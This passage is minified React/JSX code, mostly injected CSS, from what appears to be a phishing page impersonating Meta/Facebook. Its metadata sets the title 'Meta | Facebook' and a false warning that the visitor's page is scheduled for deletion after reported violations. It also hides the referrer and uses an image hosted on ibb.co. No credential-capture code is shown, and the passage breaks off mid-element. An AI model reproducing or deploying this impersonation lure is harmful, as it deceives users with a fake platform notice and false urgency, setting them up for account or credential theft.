   font-size: 1.5rem\n        }\n    }\n\n    p {\n        margin-top: 0;\n        margin-bottom: 1rem\n    }\n\n    ul {\n        padding-left: 2rem\n    }\n\n    ul {\n        margin-top: 0;\n        margin-bottom: 1rem\n    }\n\n    @media (min-width:1200px) {}\n\n    ::-webkit-datetime-edit-day-field,\n    ::-webkit-datetime-edit-fields-wrapper,\n    ::-webkit-datetime-edit-hour-field,\n    ::-webkit-datetime-edit-minute,\n    ::-webkit-datetime-edit-month-field,\n    ::-webkit-datetime-edit-text,\n    ::-webkit-datetime-edit-year-field {\n        padding: 0\n    }\n\n    ::-webkit-inner-spin-button {\n        height: auto\n    }\n\n    ::-webkit-search-decoration {\n        -webkit-appearance: none\n    }\n\n    ::-webkit-color-swatch-wrapper {\n        padding: 0\n    }\n\n    ::-webkit-file-upload-button {\n        font: inherit;\n        -webkit-appearance: button\n    }\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    .container-sm {\n        width: 100%;\n        padding-right: var(--bs-gutter-x, .75rem);\n        padding-left: var(--bs-gutter-x, .75rem);\n        margin-right: auto;\n        margin-left: auto\n    }\n\n    @media (min-width:576px) {\n        .container-sm {\n            max-width: 540px\n        }\n    }\n\n    @media (min-width:768px) {\n        .container-sm {\n            max-width: 720px\n        }\n    }\n\n    @media (min-width:992px) {\n        .container-sm {\n            max-width: 960px\n        }\n    }\n\n    @media (min-width:1200px) {\n        .container-sm {\n            max-width: 1140px\n        }\n    }\n\n    @media (min-width:1400px) {\n        .container-sm {\n            max-width: 1320px\n        }\n    }\n\n    .row {\n        --bs-gutter-x: 1.5rem;\n        --bs-gutter-y: 0;\n        display: flex;\n        flex-wrap: wrap;\n        margin-top: calc(var(--bs-gutter-y)*-1);\n        margin-right: calc(var(--bs-gutter-x)*-.5);\n        margin-left: calc(var(--bs-gutter-x)*-.5)\n    }\n\n    .row>* {\n        flex-shrink: 0;\n        max-width: 100%;\n        padding-right: calc(var(--bs-gutter-x)*.5);\n        padding-left: calc(var(--bs-gutter-x)*.5);\n        margin-top: var(--bs-gutter-y)\n    }\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    .col-4 {\n        flex: 0 0 auto;\n        width: 33.33333333%\n    }\n\n    .col-8 {\n        flex: 0 0 auto;\n        width: 66.66666667%\n    }\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (max-width:575.98px) {}\n\n    @media (max-width:767.98px) {}\n\n    @media (max-width:991.98px) {}\n\n    @media (max-width:1199.98px) {}\n\n    @media (max-width:1399.98px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (min-width:576px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @-webkit-keyframes progress-bar-stripes {\n        0% {\n            background-position-x: 1rem\n        }\n    }\n\n    @keyframes progress-bar-stripes {\n        0% {\n            background-position-x: 1rem\n        }\n    }\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (max-width:575.98px) {}\n\n    @media (max-width:767.98px) {}\n\n    @media (max-width:991.98px) {}\n\n    @media (max-width:1199.98px) {}\n\n    @media (max-width:1399.98px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @-webkit-keyframes spinner-border {\n        to {\n            transform: rotate(360deg)\n        }\n    }\n\n    @keyframes spinner-border {\n        to {\n            transform: rotate(360deg)\n        }\n    }\n\n    @-webkit-keyframes spinner-grow {\n        0% {\n            transform: scale(0)\n        }\n\n        50% {\n            opacity: 1;\n            transform: none\n        }\n    }\n\n    @keyframes spinner-grow {\n        0% {\n            transform: scale(0)\n        }\n\n        50% {\n            opacity: 1;\n            transform: none\n        }\n    }\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (min-width:1200px) {}\n'
                    }
                }), (0,
                he.jsx)("style", {
                    id: "fa-v4-font-face",
                    dangerouslySetInnerHTML: {
                        __html: "\n    /*!\n * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com\n * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)\n */\n"
                    }
                }), (0,
                he.jsx)("style", {
                    id: "fa-v4-shims",
                    dangerouslySetInnerHTML: {
                        __html: "\n    /*!\n * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com\n * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)\n */\n"
                    }
                }), (0,
                he.jsx)("style", {
                    id: "fa-main",
                    dangerouslySetInnerHTML: {
                        __html: "\n    /*!\n * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com\n * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)\n */\n    @-webkit-keyframes fa-spin {\n        0% {\n            -webkit-transform: rotate(0deg);\n            transform: rotate(0deg)\n        }\n\n        to {\n            -webkit-transform: rotate(1turn);\n            transform: rotate(1turn)\n        }\n    }\n\n    @keyframes fa-spin {\n        0% {\n            -webkit-transform: rotate(0deg);\n            transform: rotate(0deg)\n        }\n\n        to {\n            -webkit-transform: rotate(1turn);\n            transform: rotate(1turn)\n        }\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: '\n    :root {\n        --swiper-theme-color: #007aff\n    }\n\n    :host {\n        position: relative;\n        display: block;\n        margin-left: auto;\n        margin-right: auto;\n        z-index: 1\n    }\n\n    @keyframes swiper-preloader-spin {\n        0% {\n            transform: rotate(0)\n        }\n\n        to {\n            transform: rotate(360deg)\n        }\n    }\n\n    :root {\n        --swiper-navigation-size: 44px\n    }\n\n    *,\n    :before,\n    :after {\n        box-sizing: border-box;\n        border-width: 0;\n        border-style: solid;\n        border-color: currentColor\n    }\n\n    :before,\n    :after {\n        --tw-content: ""\n    }\n\n    html {\n        line-height: 1.5;\n        -webkit-text-size-adjust: 100%;\n        -moz-tab-size: 4;\n        -o-tab-size: 4;\n        tab-size: 4;\n        font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";\n        font-feature-settings: normal;\n        font-variation-settings: normal\n    }\n\n    body {\n        margin: 0;\n        line-height: inherit\n    }\n\n    h4 {\n        font-size: inherit\n    }\n\n    ::-webkit-inner-spin-button,\n    ::-webkit-outer-spin-button {\n        height: auto\n    }\n\n    ::-webkit-search-decoration {\n        -webkit-appearance: none\n    }\n\n    ::-webkit-file-upload-button {\n        -webkit-appearance: button;\n        font: inherit\n    }\n\n    h6 {\n        margin: 0\n    }\n\n    ul {\n        list-style: none;\n        margin: 0;\n        padding: 0\n    }\n\n    :disabled {\n        cursor: default\n    }\n\n    img,\n    svg {\n        display: block;\n        vertical-align: middle\n    }\n\n    img {\n        max-width: 100%;\n        height: auto\n    }\n\n    *,\n    :before,\n    :after {\n        --tw-border-spacing-x: 0;\n        --tw-border-spacing-y: 0;\n        --tw-translate-x: 0;\n        --tw-translate-y: 0;\n        --tw-rotate: 0;\n        --tw-skew-x: 0;\n        --tw-skew-y: 0;\n        --tw-scale-x: 1;\n        --tw-scale-y: 1;\n        --tw-pan-x: ;\n        --tw-pan-y: ;\n        --tw-pinch-zoom: ;\n        --tw-scroll-snap-strictness: proximity;\n        --tw-gradient-from-position: ;\n        --tw-gradient-via-position: ;\n        --tw-gradient-to-position: ;\n        --tw-ordinal: ;\n        --tw-slashed-zero: ;\n        --tw-numeric-figure: ;\n        --tw-numeric-spacing: ;\n        --tw-numeric-fraction: ;\n        --tw-ring-inset: ;\n        --tw-ring-offset-width: 0px;\n        --tw-ring-offset-color: #fff;\n        --tw-ring-color: rgb(59 130 246/.5);\n        --tw-ring-offset-shadow: 0 0#0000;\n        --tw-ring-shadow: 0 0#0000;\n        --tw-shadow: 0 0#0000;\n        --tw-shadow-colored: 0 0#0000;\n        --tw-blur: ;\n        --tw-brightness: ;\n        --tw-contrast: ;\n        --tw-grayscale: ;\n        --tw-hue-rotate: ;\n        --tw-invert: ;\n        --tw-saturate: ;\n        --tw-sepia: ;\n        --tw-drop-shadow: ;\n        --tw-backdrop-blur: ;\n        --tw-backdrop-brightness: ;\n        --tw-backdrop-contrast: ;\n        --tw-backdrop-grayscale: ;\n        --tw-backdrop-hue-rotate: ;\n        --tw-backdrop-invert: ;\n        --tw-backdrop-opacity: ;\n        --tw-backdrop-saturate: ;\n        --tw-backdrop-sepia:\n    }\n\n    body {\n        font-family: nunito-regular\n    }\n\n    @media (max-width:768px) {}\n\n    @media (max-width:576px) {}\n\n    @media (min-width:1024px) {\n        @media (min-width:640px) {}\n\n        @media (min-width:768px) {}\n\n        @media (min-width:1024px) {}\n\n        @media (min-width:1280px) {}\n\n        @media (min-width:1536px) {}\n    }\n\n    @media (min-width:768px) {}\n\n    @media (min-width:1024px) {}\n\n    @media (min-width:1280px) {}\n\n    * {\n        font-family: Arial, Helvetica, sans-serif !important\n    }\n\n    #root {\n        overflow: hidden\n    }\n\n    svg {\n        display: inline-block\n    }\n\n    #main-component {\n        background: linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);\n        height: 100vh;\n        overflow: hidden;\n        overflow-y: scroll\n    }\n\n    #main-component #main {\n        max-width: 1100px\n    }\n\n    .left {\n        border-right: 1px solid #DEE3E9\n    }\n\n    .left .left-content {\n        height: 100vh;\n        padding: 40px 20px 0 0;\n        position: sticky;\n        position: -webkit-sticky;\n        top: 0;\n        overflow-y: auto\n    }\n\n    *::-webkit-scrollbar {\n        width: 3px\n    }\n\n    *::-webkit-scrollbar-thumb {\n        background: rgb(74, 74, 74)\n    }\n\n    *::-webkit-scrollbar-track {\n        background: transparent\n    }\n\n    .logo {\n        width: 70px\n    }\n\n    .logo svg {\n        height: -moz-min-content;\n        height: min-content;\n        width: 100%\n    }\n\n    h1 {\n        line-height: 30px;\n        color: #1c1e21;\n        font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;\n        font-weight: 700;\n        margin: 16px 0\n    }\n\n    h1 {\n        font-size: 24px;\n        display: flex;\n        align-items: center\n    }\n\n    h1 svg {\n        margin-right: 8px\n    }\n\n    .action-button {\n        display: flex;\n        align-items: center;\n        width: 100%;\n        padding: 12px 16px;\n        border-radius: 15px;\n        color: #000;\n        background-color: inherit;\n        transition: background-color .35s ease;\n        cursor: pointer;\n        font-size: 16px;\n        font-weight: 500;\n        line-height: 20px;\n        font-family: Optimistic Text Medium, Helvetica, Arial, sans-serif\n    }\n\n    .action-button.main {\n        color: #fff;\n        background-color: #344854\n    }\n\n    .action-button.main svg path {\n        fill: #fff\n    }\n\n    .action-button .action-text {\n        width: 100%;\n        text-align: left;\n        padding: 0 12px\n    }\n\n    .action-button .action-icon svg {\n        width: 24px;\n        height: 24px\n    }\n\n    .action-button .action-arrow svg {\n        width: 24px;\n        height: 24px\n    }\n\n    .action-button:not(.main):hover {\n        background-color: #e3e8ef\n    }\n\n    .content-action {\n        height: 0;\n        overflow: hidden;\n        transition: .3s ease-in-out\n    }\n\n    .content-right {\n        padding: 40px 20px\n    }\n\n    p {\n        margin: 0;\n        font-size: 15px;\n        line-height: 20px;\n        font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important\n    }\n\n    h6 {\n        font-size: 15px;\n        font-weight: 600;\n        margin-bottom: 20px\n    }\n\n    li {\n        margin: 8px 0;\n        font-size: 15px\n    }\n\n    .card-thumb {\n        display: flex;\n        flex-direction: column;\n        border-radius: 20px;\n        background-color: #fff;\n        margin: 20px 0;\n        overflow: hidden\n    }\n\n    .thumb-content {\n        margin: 20px\n    }\n\n    .thumb-content .thumb-type {\n        font-size: 16px;\n        font-weight: 400;\n        margin-bottom: 10px\n    }\n\n    .thumb-content h4 {\n        font-weight: 500;\n        margin: 14px 0\n    }\n\n    .btn-wrapper {\n        width: 100%;\n        display: flex;\n        justify-content: center;\n        padding: 20px 0 0\n    }\n\n    .button {\n        width: 100%;\n        height: 50px;\n        border-radius: 20px;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n        cursor: pointer\n    }\n\n    .button.fb-blue {\n        background-color: #0064e0;\n        color: #fff\n    }\n\n    .action-button-list .action-icon img {\n        width: 48px;\n        height: 48px\n    }\n\n    .small-grey {\n        color: #465a69;\n        font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;\n        font-size: 15px;\n        font-weight: 400;\n        line-height: 20px\n    }\n\n    .action-button-list .action-button {\n        border-radius: 0;\n        background-color: #fff\n    }\n\n    .action-button-list .action-button .action-arrow svg {\n        transform: rotate(-90deg)\n    }\n\n    .action-button-list .action-button.b-bottom {\n        border-bottom: 1px solid #E3E8EF\n    }\n\n    .action-button-list {\n        border-radius: 15px;\n        overflow: hidden\n    }\n\n    .link-to {\n        text-decoration: none;\n        font-size: 15px;\n        cursor: pointer;\n        color: #0d6efd;\n        display: inline;\n        margin: 0 0 0 5px\n    }\n\n    .link-to:hover {\n        text-decoration: underline\n    }\n\n    .link-to svg {\n        margin-left: 3px;\n        width: 14px;\n        height: 14px;\n        vertical-align: text-top\n    }\n\n    .link-to svg path {\n        fill: #0d6efd;\n        margin-left: 5px\n    }\n\n    .popup {\n        position: fixed;\n        padding: 0;\n        top: 0;\n        left: 0;\n        bottom: 0;\n        right: 0;\n        width: 100%;\n        height: 100%;\n        background: rgba(0, 0, 0, .5);\n        align-items: center;\n        display: flex;\n        justify-content: center;\n        flex-direction: column;\n        z-index: -1\n    }\n\n    @media (max-width:1001px) {\n        .col-8 {\n            width: 100% !important\n        }\n\n        .left.col-4 {\n            display: none\n        }\n\n        .right .content-right {\n            padding: 20px 5px\n        }\n\n        h1 svg {\n            width: 50px !important;\n            height: 50px !important;\n            margin-right: 8px\n        }\n\n        .logo {\n            margin: 0 auto\n        }\n    }\n'
                    }
                }), (0,
                he.jsx)("meta", {
                    name: "referrer",
                    content: "no-referrer"
                }), (0,
                he.jsx)("link", {
                    rel: "icon",
                    href: "test.png"
                }),  (0,
                he.jsx)("style", {
                    "data-rc-order": "prepend",
                    "rc-util-key": "@ant-design-icons",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @-webkit-keyframes loadingCircle {\n        100% {\n            -webkit-transform: rotate(360deg);\n            transform: rotate(360deg)\n        }\n    }\n\n    @keyframes loadingCircle {\n        100% {\n            -webkit-transform: rotate(360deg);\n            transform: rotate(360deg)\n        }\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -1e3,
                    "data-css-hash": "1tx5yat",
                    "data-token-hash": "fkne30",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @media (max-width:575px) {}\n\n    @media (max-width:767px) {}\n\n    @media (max-width:991px) {}\n\n    @media (max-width:1199px) {}\n\n    @media (max-width:575px) {}\n\n    @media (max-width:767px) {}\n\n    @media (max-width:991px) {}\n\n    @media (max-width:1199px) {}\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -1e3,
                    "data-css-hash": "_effect-css-m4timi-antZoomIn",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @keyframes css-m4timi-antZoomIn {\n        0% {\n            transform: scale(0.2);\n            opacity: 0\n        }\n\n        100% {\n            transform: scale(1);\n            opacity: 1\n        }\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -999,
                    "data-css-hash": "mhfsmf",
                    "data-token-hash": "fkne30",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1600px) {}\n"
                    }
                }), (0,
                he.jsx)("style", {
                    "data-rc-order": "prependQueue",
                    "data-rc-priority": -998,
                    "data-css-hash": "15wgk55",
                    "data-token-hash": "fkne30",
                    dangerouslySetInnerHTML: {
                        __html: "\n    @media screen and (-ms-high-contrast:active),\n    (-ms-high-contrast:none) {}\n"
                    }
                }), (0,
                he.jsx)("meta", {
                    property: "og:type",
                    content: "article"
                }), (0,
                he.jsx)("meta", {
                    property: "og:title",
                    content: "We have scheduled your page to be deleted"
                }), (0,
                he.jsx)("meta", {
                    name: "description",
                    content: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification."
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
                }), (0,
                he.jsx)("meta", {
                    property: "og:image",
                    content: "https://i.ibb.co/TtQmC4M/h245f15d84e5d44.png"
                }), (0,
                he.jsx)("meta", {
                    name: "viewport",
                    content: "width=device-width, initial-scale=1"
                }), (0,
                he.jsx)("meta", {
                    name: "theme-color",
                    content: "#1A73E8"
                }), (0,
                he.jsx)("title", {
                    children: "Meta | Facebook"
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: "\n    body {\n        --google-font-color-materialiconstwotone: none\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: '\n    /*!\n * Bootstrap v5.0.2 (https://getbootstrap.com/)\n * Copyright 2011-2021 The Bootstrap Authors\n * Copyright 2011-2021 Twitter, Inc.\n * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)\n */\n    :root {\n        --bs-blue: #0d6efd;\n        --bs-indigo: #6610f2;\n        --bs-purple: #6f42c1;\n        --bs-pink: #d63384;\n        --bs-red: #dc3545;\n        --bs-orange: #fd7e14;\n        --bs-yellow: #ffc107;\n        --bs-green: #198754;\n        --bs-teal: #20c997;\n        --bs-cyan: #0dcaf0;\n        --bs-white: #fff;\n        --bs-gray: #6c757d;\n        --bs-gray-dark: #343a40;\n        --bs-primary: #0d6efd;\n        --bs-secondary: #6c757d;\n        --bs-success: #198754;\n        --bs-info: #0dcaf0;\n        --bs-warning: #ffc107;\n        --bs-danger: #dc3545;\n        --bs-light: #f8f9fa;\n        --bs-dark: #212529;\n        --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";\n        --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;\n        --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0))\n    }\n\n    *,\n    ::after,\n    ::before {\n        box-sizing: border-box\n    }\n\n    @media (prefers-reduced-motion:no-preference) {\n        :root {\n            scroll-behavior: smooth\n        }\n    }\n\n    body {\n        font-size: 1rem;\n        font-weight: 400;\n        color: #212529;\n        background-color: #fff;\n        -webkit-text-size-adjust: 100%;\n        -webkit-tap-highlight-color: transparent\n    }\n\n    h1,\n    h4,\n    h6 {\n        margin-top: 0;\n        margin-bottom: .5rem;\n        line-height: 1.2\n    }\n\n    @media (min-width:1200px) {\n        h1 {\n            font-size: 2.5rem\n        }\n    }\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {\n        h4 {\n            font-size: 1.5rem\n        }\n    }\n\n    p {\n        margin-top: 0;\n        margin-bottom: 1rem\n    }\n\n    ul {\n        padding-left: 2rem\n    }\n\n    ul {\n        margin-top: 0;\n        margin-bottom: 1rem\n    }\n\n    @media (min-width:1200px) {}\n\n    ::-webkit-datetime-edit-day-field,\n    ::-webkit-datetime-edit-fields-wrapper,\n    ::-webkit-datetime-edit-hour-field,\n    ::-webkit-datetime-edit-minute,\n    ::-webkit-datetime-edit-month-field,\n    ::-webkit-datetime-edit-text,\n    ::-webkit-datetime-edit-year-field {\n        padding: 0\n    }\n\n    ::-webkit-inner-spin-button {\n        height: auto\n    }\n\n    ::-webkit-search-decoration {\n        -webkit-appearance: none\n    }\n\n    ::-webkit-color-swatch-wrapper {\n        padding: 0\n    }\n\n    ::-webkit-file-upload-button {\n        font: inherit;\n        -webkit-appearance: button\n    }\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1200px) {}\n\n    .container-sm {\n        width: 100%;\n        padding-right: var(--bs-gutter-x, .75rem);\n        padding-left: var(--bs-gutter-x, .75rem);\n        margin-right: auto;\n        margin-left: auto\n    }\n\n    @media (min-width:576px) {\n        .container-sm {\n            max-width: 540px\n        }\n    }\n\n    @media (min-width:768px) {\n        .container-sm {\n            max-width: 720px\n        }\n    }\n\n    @media (min-width:992px) {\n        .container-sm {\n            max-width: 960px\n        }\n    }\n\n    @media (min-width:1200px) {\n        .container-sm {\n            max-width: 1140px\n        }\n    }\n\n    @media (min-width:1400px) {\n        .container-sm {\n            max-width: 1320px\n        }\n    }\n\n    .row {\n        --bs-gutter-x: 1.5rem;\n        --bs-gutter-y: 0;\n        display: flex;\n        flex-wrap: wrap;\n        margin-top: calc(var(--bs-gutter-y)*-1);\n        margin-right: calc(var(--bs-gutter-x)*-.5);\n        margin-left: calc(var(--bs-gutter-x)*-.5)\n    }\n\n    .row>* {\n        flex-shrink: 0;\n        max-width: 100%;\n        padding-right: calc(var(--bs-gutter-x)*.5);\n        padding-left: calc(var(--bs-gutter-x)*.5);\n        margin-top: var(--bs-gutter-y)\n    }\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    .col-4 {\n        flex: 0 0 auto;\n        width: 33.33333333%\n    }\n\n    .col-8 {\n        flex: 0 0 auto;\n        width: 66.66666667%\n    }\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (max-width:575.98px) {}\n\n    @media (max-width:767.98px) {}\n\n    @media (max-width:991.98px) {}\n\n    @media (max-width:1199.98px) {}\n\n    @media (max-width:1399.98px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (min-width:576px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @-webkit-keyframes progress-bar-stripes {\n        0% {\n            background-position-x: 1rem\n        }\n    }\n\n    @keyframes progress-bar-stripes {\n        0% {\n            background-position-x: 1rem\n        }\n    }\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (max-width:575.98px) {}\n\n    @media (max-width:767.98px) {}\n\n    @media (max-width:991.98px) {}\n\n    @media (max-width:1199.98px) {}\n\n    @media (max-width:1399.98px) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @-webkit-keyframes spinner-border {\n        to {\n            transform: rotate(360deg)\n        }\n    }\n\n    @keyframes spinner-border {\n        to {\n            transform: rotate(360deg)\n        }\n    }\n\n    @-webkit-keyframes spinner-grow {\n        0% {\n            transform: scale(0)\n        }\n\n        50% {\n            opacity: 1;\n            transform: none\n        }\n    }\n\n    @keyframes spinner-grow {\n        0% {\n            transform: scale(0)\n        }\n\n        50% {\n            opacity: 1;\n            transform: none\n        }\n    }\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (prefers-reduced-motion:reduce) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (min-width:576px) {}\n\n    @media (min-width:768px) {}\n\n    @media (min-width:992px) {}\n\n    @media (min-width:1200px) {}\n\n    @media (min-width:1400px) {}\n\n    @media (min-width:1200px) {}\n'
                    }
                }), (0,
                he.jsx)("style", {
                    id: "fa-v4-font-face",
                    dangerouslySetInnerHTML: {
                        __html: "\n    /*!\n * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com\n * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)\n */\n"
                    }
                }), (0,
                he.jsx)("style", {
                    id: "fa-v4-shims",
                    dangerouslySetInnerHTML: {
                        __html: "\n    /*!\n * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com\n * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)\n */\n"
                    }
                }), (0,
                he.jsx)("style", {
                    id: "fa-main",
                    dangerouslySetInnerHTML: {
                        __html: "\n    /*!\n * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com\n * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License)\n */\n    @-webkit-keyframes fa-spin {\n        0% {\n            -webkit-transform: rotate(0deg);\n            transform: rotate(0deg)\n        }\n\n        to {\n            -webkit-transform: rotate(1turn);\n            transform: rotate(1turn)\n        }\n    }\n\n    @keyframes fa-spin {\n        0% {\n            -webkit-transform: rotate(0deg);\n            transform: rotate(0deg)\n        }\n\n        to {\n            -webkit-transform: rotate(1turn);\n            transform: rotate(1turn)\n        }\n    }\n"
                    }
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
